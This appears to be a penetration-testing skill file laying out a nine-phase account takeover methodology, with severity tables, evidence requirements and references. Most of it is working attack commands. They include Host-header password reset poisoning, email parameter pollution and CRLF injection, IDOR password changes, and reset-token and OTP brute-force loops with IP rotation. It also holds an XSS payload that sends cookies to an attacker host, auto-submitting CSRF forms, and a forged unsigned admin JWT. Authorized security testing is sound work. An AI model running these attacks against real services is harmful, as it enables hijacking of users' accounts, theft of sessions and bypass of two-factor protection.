---
name: attack-account-takeover
description: "Account Takeover — password reset poisoning, IDOR/parameter pollution on identity fields, weak reset tokens, unicode collision, and web-vuln-driven session hijack chains"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - account-takeover
  - ato
  - authentication
  - password-reset
  - idor
  - web
  - attack
tech_stack:
  - web
  - oauth
  - jwt
cwe_ids:
  - CWE-640
  - CWE-620
  - CWE-201
  - CWE-352
chains_with:
  - attack-jwt
  - wstg-athn-09
  - wstg-idnt-04
prerequisites: []
severity_boost:
  attack-jwt: "Weak/forgeable JWT + email/role tampering = full account impersonation without reset flow"
  wstg-athn-09: "Weak reset token generation confirmed by WSTG-ATHN-09 = brute-forceable ATO at scale"
  wstg-idnt-04: "Account provisioning flaw from WSTG-IDNT-04 combined with IDOR = mass account creation/takeover"
---

# Account Takeover (ATO)

## Objective

Gain unauthorized access to another user's account by abusing password reset logic, identity parameter handling, token weaknesses, or chaining a web vulnerability (XSS/CSRF/request smuggling/JWT tampering) into session hijack.

## Testing Methodology

### Phase 1: Password Reset Token Leak via Referer

```bash
# 1. Trigger password reset for your own test account
curl -s -X POST "https://TARGET/api/forgot-password" -d "email=test@ATTACKER.com"

# 2. Open the reset link in a browser, DO NOT change password, click any outbound
#    third-party resource on that page (analytics, avatar CDN, social share button)
# 3. Intercept with Burp and inspect the Referer header sent to the third party
curl -s -A "Mozilla/5.0" -e "https://TARGET/reset-password?token=CAPTURED_TOKEN" \
  "https://THIRD_PARTY_DOMAIN/track" -v | grep -i referer
```

### Phase 2: Password Reset Poisoning (Host Header Injection)

```bash
# Poison Host / X-Forwarded-Host so the reset link points to attacker domain
curl -s -X POST "https://TARGET/reset.php" \
  -H "Host: ATTACKER.DOMAIN.TLD" \
  -H "X-Forwarded-Host: ATTACKER.DOMAIN.TLD" \
  -H "Content-Type: application/json" \
  --data '{"email":"victim@target.com"}'

# If the app emails a link like https://ATTACKER.DOMAIN.TLD/reset-password.php?token=TOKEN
# have the victim (or automated bot/support crawler) click it -> token lands in your logs
```

### Phase 3: Password Reset via Email Parameter Pollution

```bash
# HTTP parameter pollution — second value may win server-side
curl -s -X POST "https://TARGET/forgot-password" \
  -d "email=victim@mail.com&email=ATTACKER@mail.com"

# JSON array of emails
curl -s -X POST "https://TARGET/api/forgot-password" \
  -H "Content-Type: application/json" \
  --data '{"email":["victim@mail.com","ATTACKER@mail.com"]}'

# CRLF injection to add cc/bcc recipient
curl -s -X POST "https://TARGET/forgot-password" \
  --data-urlencode "email=victim@mail.com%0A%0Dcc:ATTACKER@mail.com"

# Separator-based multi-recipient
curl -s -X POST "https://TARGET/forgot-password" -d "email=victim@mail.com,ATTACKER@mail.com"
curl -s -X POST "https://TARGET/forgot-password" -d "email=victim@mail.com|ATTACKER@mail.com"
```

### Phase 4: IDOR on Identity/Change-Password Parameters

```bash
# Login as your own low-priv account, then tamper the identity field on
# change-password / update-profile endpoints
curl -s -X POST "https://TARGET/api/changepass" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"email":"victim@target.com","password":"NewP@ssw0rd!"}'

# Also test numeric IDOR on user_id / account_id in the same request
curl -s -X POST "https://TARGET/api/changepass" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" \
  --data '{"user_id":1001,"password":"NewP@ssw0rd!"}'
```

### Phase 5: Weak/Guessable Reset Token

```bash
# Trigger multiple resets and diff tokens for pattern (timestamp/UserID/sequence)
for i in 1 2 3; do
  curl -s -X POST "https://TARGET/api/forgot-password" -d "email=test$i@ATTACKER.com"
  sleep 1
done
# Inspect for: incrementing IDs, epoch timestamps, MD5(email+time), short [A-Za-z0-9]{<6} tokens

# If token space is small, brute force it directly
for token in $(seq 100000 100999); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://TARGET/reset-password?token=$token&email=victim@target.com")
  [ "$code" == "200" ] && echo "HIT: $token"
done
```

### Phase 6: Leaking Reset Token in API Response

```bash
# Some APIs echo the resetToken in the JSON response instead of only emailing it
curl -s -X POST "https://TARGET/v3/user/password/forgot" \
  -H "Content-Type: application/json" \
  --data '{"email":"victim@target.com"}' | jq .

# If resetToken is present in the body, immediately use it:
curl -s "https://TARGET/v3/user/password/reset?resetToken=LEAKED_TOKEN&email=victim@target.com" \
  -X POST --data '{"newPassword":"NewP@ssw0rd!"}'
```

### Phase 7: Username/Email Collision (Whitespace & Unicode)

```bash
# Register "admin " (trailing whitespace) then request reset for that account —
# some backends trim/compare loosely and the reset token authenticates the real "admin"
curl -s -X POST "https://TARGET/register" -d "username=admin%20&email=ATTACKER@mail.com&password=Passw0rd!"
curl -s -X POST "https://TARGET/forgot-password" -d "username=admin%20"

# Unicode confusable registration: demo@gmail.com vs demⓞ@gmail.com
curl -s -X POST "https://TARGET/register" -d "email=dem%E2%93%9E@gmail.com&password=Passw0rd!"
# Use https://github.com/tomnomnom/hacks/tree/master/unisub to enumerate confusable glyphs
# for the target's normalization routine (NFKC/NFKD collapse many lookalikes to ASCII)
```

### Phase 8: Chained Web-Vuln Takeover (XSS / CSRF / Request Smuggling / JWT)

```bash
# XSS -> session cookie theft (requires stored/reflected XSS on target or *.target.com
# when cookies are scoped to the parent domain)
echo '<script>fetch("https://ATTACKER_IP:8888/steal?c="+document.cookie)</script>'

# CSRF -> forced password change (no CSRF token / SameSite=None)
cat > csrf-ato.html <<'EOF'
<html><body onload="document.forms[0].submit()">
  <form action="https://TARGET/api/change-password" method="POST">
    <input name="password" value="Attacker123!">
  </form>
</body></html>
EOF

# HTTP Request Smuggling -> desync response to attacker-controlled redirect
git clone https://github.com/defparam/smuggler.git && cd smuggler && python3 smuggler.py -u https://TARGET

# JWT tampering -> edit sub/email claim, drop/forge signature (see attack-jwt)
python3 -c "
import jwt
print(jwt.encode({'sub':'victim@target.com','role':'admin'}, '', algorithm='none'))
"
```

### Phase 9: MFA/2FA Bypass

```bash
# 1. Response Manipulation — intercept the 2FA verification response and flip the flag
curl -s -X POST "https://TARGET/api/2fa/verify" \
  -H "Content-Type: application/json" \
  --data '{"code":"000000"}'
# If response is {"success":false,...}, use Burp Repeater/Match&Replace to force the
# client to treat it as {"success":true}

# 2. Status Code Manipulation — change a 4xx verification response to 200 OK
curl -s -X POST "https://TARGET/api/2fa/verify" --data '{"code":"111111"}' -D -
# In Burp: intercept the response and change "401 Unauthorized"/"400 Bad Request" -> "200 OK"

# 3. 2FA Code Leakage in Response / JS — inspect the code-triggering request/response and JS files
curl -s -X POST "https://TARGET/api/2fa/send-code" -H "Authorization: Bearer YOUR_SESSION_TOKEN" | jq .
curl -s "https://TARGET/static/js/2fa.js" | grep -iE 'otp|code|debug'

# 4. Lack of Brute-Force Protection — brute force the OTP (commonly 4-6 digits, no rate limit)
for code in $(seq -w 0 9999); do
  resp=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://TARGET/api/2fa/verify" \
    -H "Authorization: Bearer YOUR_SESSION_TOKEN" --data "{\"code\":\"$code\"}")
  [ "$resp" == "200" ] && echo "HIT: $code" && break
done
# If throttled, rotate X-Forwarded-For / use Burp Intruder Cluster Bomb across IPs

# 5. Race Condition in OTP Verification — fire concurrent guesses so the lockout counter
#    (often non-atomic) never increments fast enough to block the winning guess
seq 1 20 | xargs -P20 -I{} curl -s -X POST "https://TARGET/api/2fa/verify" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" --data '{"code":"{}"}'
# Or use Turbo Intruder / Burp "Send group in parallel" (single-packet attack) to land all
# guesses before the attempt counter is persisted

# 6. Missing 2FA Code Integrity Validation — a code issued for ANY account verifies ANY account
curl -s -X POST "https://TARGET/api/2fa/verify" \
  -H "Authorization: Bearer VICTIM_OR_OTHER_ACCOUNT_TOKEN" --data '{"code":"YOUR_OWN_VALID_CODE"}'

# 7. Bypass with null / 000000 / array-based OTP (weak server-side comparison)
curl -s -X POST "https://TARGET/api/2fa/verify" --data '{"otp":null}'
curl -s -X POST "https://TARGET/api/2fa/verify" --data '{"otp":"000000"}'
curl -s -X POST "https://TARGET/api/2fa/verify" -H "Content-Type: application/json" \
  --data '{"otp":["1234","1111","1337","2222","3333","4444","5555"]}'

# 8. Bypass 2FA by Force Browsing — skip /2fa/verify and hit the post-login endpoint directly
#    using the partially-authenticated (pre-2FA) session/cookie
curl -s "https://TARGET/my-account" -H "Cookie: session=PARTIALLY_AUTHENTICATED_SESSION"

# 9. Backup Code Abuse — apply techniques 1/4/5/6 against the recovery/backup-code flow,
#    which is frequently less protected than the primary OTP flow
curl -s -X POST "https://TARGET/api/2fa/backup-code/verify" \
  -H "Authorization: Bearer YOUR_SESSION_TOKEN" --data '{"backup_code":"00000000"}'

# 10. CSRF on 2FA Disabling — no CSRF token / no auth re-confirmation on the disable endpoint
cat > csrf-2fa-disable.html <<'EOF'
<html><body onload="document.forms[0].submit()">
  <form action="https://TARGET/api/2fa/disable" method="POST">
    <input name="confirm" value="true">
  </form>
</body></html>
EOF
```

## What Constitutes a Finding

| Finding | Severity |
|---|---|
| Full account takeover without user interaction (poisoning, IDOR, token leak) | Critical (P1) |
| Weak/predictable reset token enabling brute force | Critical (P1) |
| Reset token leaked via Referer / API response body | High (P2) |
| Email parameter pollution allows CC/BCC or alt-recipient of reset link | High (P2) |
| Unicode/whitespace collision allowing account impersonation on registration | High (P2) |
| CSRF on password/email change with no token/SameSite protection | High (P2) |
| Requires XSS/smuggling as prerequisite (partial chain) | Medium (P3) |

## Evidence Requirements

- Full HTTP request/response pair showing the vulnerable reset/change endpoint
- Captured token (Referer leak, API leak, or brute-forced value) and proof it authenticates
- Screenshot or session proof of logging in as the victim account after exploitation
- For pollution/collision attacks: side-by-side of victim vs. attacker-controlled values accepted

## Tools

- `curl` / Burp Repeater — manual reset-flow tampering
- `smuggler` — HTTP request smuggling detection (defparam/smuggler)
- `unisub` — Unicode confusable character suggestion (tomnomnom/hacks)
- `jwt` (PyJWT) — token forging/tampering, use alongside `attack-jwt`

## References

- [PayloadsAllTheThings: Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover)
- [10 Password Reset Flaws - Anugrah SR](https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- [Unicode Pentester Cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/)
- [Hacking Grindr Accounts with Copy and Paste - Troy Hunt](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
